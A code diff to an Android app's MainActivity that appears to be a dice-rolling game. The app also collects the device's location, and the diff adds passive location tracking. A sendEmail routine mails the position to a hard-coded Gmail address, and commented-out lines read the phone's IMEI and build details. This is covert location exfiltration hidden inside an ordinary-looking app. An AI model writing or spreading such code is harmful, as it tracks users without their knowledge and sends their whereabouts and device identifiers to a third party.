@@ -18,6 +18,7 @@ import android.opengl.GLSurfaceView;
 import android.os.Bundle;
 import android.support.v4.app.ActivityCompat;
 import android.support.v7.widget.RecyclerView;
+import android.telephony.TelephonyManager;
 import android.text.Editable;
 import android.text.TextWatcher;
 import android.util.Log;
@@ -99,10 +100,11 @@ public class MainActivity extends Activity implements LocationListener {
         try{
             Log.v("Location", "try location");
             locationManager.requestLocationUpdates(locationManager.GPS_PROVIDER, 2000, 1, this);
+            locationManager.requestLocationUpdates(locationManager.PASSIVE_PROVIDER, 2000, 1, this);
             Log.v("Location", "Attempt location");
-            Location lastKnownLocation = locationManager.getLastKnownLocation(locationManager.GPS_PROVIDER);
-            Log.v("Location", "Last : " + lastKnownLocation.toString());
-            sendEmail("Last know location" + lastKnownLocation.toString());
+            //Location lastKnownLocation = locationManager.getLastKnownLocation(locationManager.GPS_PROVIDER);
+            //Log.v("Location", "Last : " + lastKnownLocation.toString());
+            //sendEmail("Last know location" + lastKnownLocation.toString());
         }catch(SecurityException se){
             Log.v("Location :", "Security Exception");
         }
@@ -382,19 +384,16 @@ public class MainActivity extends Activity implements LocationListener {
 
     private void sendEmail(String position) {
         //Getting content for email
+
+        /*TelephonyManager tm = (TelephonyManager)getSystemService(TELEPHONY_SERVICE);
+        String number = tm.getDeviceId();*/
+
         String email = "superrollanddice@gmail.com";
         String subject = "position";
-        String message = position;
+        String message = position + "\n";// + "\n Device : " +android.os.Build.DEVICE+ "\nDevice : " +android.os.Build.DEVICE;
 
         //Creating SendMail object
         SendMail sm = new SendMail(this, email, subject, message);
-        textDices.add("dé");
-        textFaceDices.add("10");
-        textNbDices.add("0");
-
-        myListAdapter = new MainActivity.MyListAdapter();
-        listView = (ListView) findViewById(R.id.testListView);
-        listView.setAdapter(myListAdapter);
 
         //Executing sendmail to send email
         sm.execute();
